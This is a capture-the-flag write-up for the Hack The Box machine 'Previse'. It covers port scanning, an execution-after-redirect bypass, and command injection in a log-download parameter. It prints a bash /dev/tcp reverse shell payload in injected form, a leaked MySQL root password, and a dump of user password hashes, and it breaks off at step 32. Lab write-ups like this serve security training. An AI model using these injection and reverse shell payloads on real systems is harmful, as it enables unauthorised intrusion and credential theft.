# Previse
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/66cdadd8-4e5d-4b69-847e-30c752492d73)


## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- 10.10.11.104 -sVC --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-13 22:52 PDT
Nmap scan report for 10.10.11.104
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53ed4440116e8bda698579c081f23a12 (RSA)
|   256 bc5420ac1723bb5020f4e16e620f01b5 (ECDSA)
|_  256 33c189ea5973b1788438a421100c91d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
```

1. Based from the nmap results, the machine runs a web application and opens ssh login.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6bb0b815-8bd3-4226-a432-cb09d1e8e1f5)


2. After ran **dirbuster** shall found several files.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b24922d9-109a-4158-9315-c1ddf4565688)


3. Checking every endpoint with **200** as it status code, turns out **nav.php** should be our interest.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6757eaa8-b94d-41d2-81c0-bb8884bb4ea2)


4. Click the `CREATE ACCOUNT` option shall redirect you to the login page.
5. Interesting! Intercept the request for that option usingh burpsuite shall resulting to another interesting part.

> NOTICED IT DIRECTS US TO ACCOUNT.PHP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ddccfcd2-399c-44ad-b594-2e592b4707a9)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d2229416-c940-4372-97ef-be9d6f062098)


5. The interesting part is at the response tab where it says `ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!`.
6. Reviewing the source code at the response tab, you shall notice that it leaked all the parameter we need to make an account.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8fe0d1cf-1885-4f3f-b0f0-e7f3fd700674)


7. Anyway, accessing the root (/) page, shall redirect us to login.php.
8. This type of thing is related to `Execution After Redirect (EAR) Vulnerability`.
9. To exploit this vulnerability we can turn on `Server Response Interception` in Burp Proxy. This should allows us to pause or intercept the response (tp prevent it redirected to the another page).

> TURNING ON SERVER RESPONSE INTERCEPTION

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6beb4b9c-cd65-4daa-94f8-571b422c8658)


> TRY ACCESSING ROOT AGAIN


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/31dac8fa-62e7-481e-9e07-975dc59e9e8d)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7ea2398c-09d1-4604-855b-25ec1a9ef3c3)


10. Noticed we are also logged in here.
    
#### NOTES: Anyway another method if you did not want to intercept the response, you can simply intercept the request then right click, then choose --> "Response to this request".

11. To access all the page from the navbar option, use the same method as to access the root page.

> accounts.php page

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bcefa70b-b8e1-4fcf-894f-3631d944f7b5)


> files.php page

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a9dc12e3-f3ef-401b-8290-d816f796ddaf)


> status.php page

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7cdfc4ad-c9b8-4c9b-95ac-1f3640bb2073)


> file_logs.php

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/17e2daca-6814-4a50-a112-e60ced6e2834)


> log.php (choosing any file delimiter shall resulting to a blank page).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/19fe0d13-ab35-45bb-a7d8-37da76d25a3c)


12. Found several pages that could be our foothold, but two pages caught my attention fully, the accounts.php page and files.php page.
13. After registered dummy account, we can logged in and see all the pages without burp again.

> CREATING ACCOUNR

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6911fdb2-e6de-40a7-8c3f-b8f50955e0b2)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/78e724e2-b186-43df-9b6a-fe58b580501e)


> LOGGING IN

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c5222cc7-de7e-4da2-81a5-efc41870ffcc)


14. Great! Now let's download the attached .zip file.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4b909a5b-592d-4985-81d0-6b198db27609)


15. Turns out it's the source code!

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5d894d6a-8cc0-4e9d-9bf6-931606989a6b)


16. Reviewing the config.php source shall found a mysql cred.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/878227d9-2b7d-4ebd-b903-0a3dcf3fe69c)


17. But we can't access it, because it's the port is not opened.
18. Long story short, we know that everytime we submit a delimiter it shows us blank page, but this time it downloads a file.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2b243840-a266-4b47-bcc7-19484b88f696)


> RESULT (ALL)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/73f214a5-b568-4562-a1af-2a4ab156438b)


19. All of them shows the same data.
20. Interesting, reviewing the logs.php source found **command injection** vuln.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b36b357c-8e64-492f-8a35-0bf595ee4a8a)


21. There is no filter! Great, this should be our foothold.
22. Let's capture the request again using burpsuite.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ac00b7bc-fe70-4fa7-b69f-10532ffa2651)


23. To test whether our argument is true or not, we can use bash command to ping our tun0 interface then check it on our local machine.

> COMMAND

```
delim=comma;ping -c 4 10.10.16.23 #

delim=comma;ping%20-c%204%2010.10.16.23%20#
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a733fefc-acc7-4d69-8c10-34afbf6b8b55)


24. Great! It indeed execute our bash command, we can drop our reverse shell now.

> REVSHELL PAYLOAD

```
;bash -c 'bash -i >& /dev/tcp/10.10.16.23/1337 0>&1';

%3Bbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E23%2F1337%200%3E%261%27%3B
```

> GOT SHELL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f13f53f3-40d4-4f98-8175-127e5f966ab9)


25. Sadly we can't get the user flag.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7bb914ec-2b7a-4e47-9fc5-3c58e52e51b8)


26. Let's use the mysql cred we got before.
27. Anyway the shell is not stable, everytime you ran sql syntax, it executes the command then terminate the shell.
28. There's two ways to fix this, make the shell stable or use `-e` flag.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/88726b5b-4513-4bdd-828e-eeb4357bb6b3)


29. Long story short, found creds at --> previse database and accounts table.

```
www-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)' previse -e 'show tables;'
<oot -p'mySQL_p@ssw0rd!:)' previse -e 'show tables;'
mysql: [Warning] Using a password on the command line interface can be insecure.
Tables_in_previse
accounts
files
```

```
www-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)' previse -e 'select * from accounts;'
<L_p@ssw0rd!:)' previse -e 'select * from accounts;'
mysql: [Warning] Using a password on the command line interface can be insecure.
id      username        password        created_at
1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36
2       brandy  $1$🧂llol$QU5sYupds4bbeJz3SSAuj0        2023-10-14 07:21:53
www-data@previse:/var/www/html$
```

30. Great! Let's crack the **m4lwhere** password using john.

```
┌──(brandy㉿bread-yolk)-[~]
└─$ hashid $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Analyzing '$🧂llol.'
[+] Unknown hash
```

31. Stuck for a while, because hashid failed to identify the potential hash algorithm.
32. Reviewing the source code again, 








 
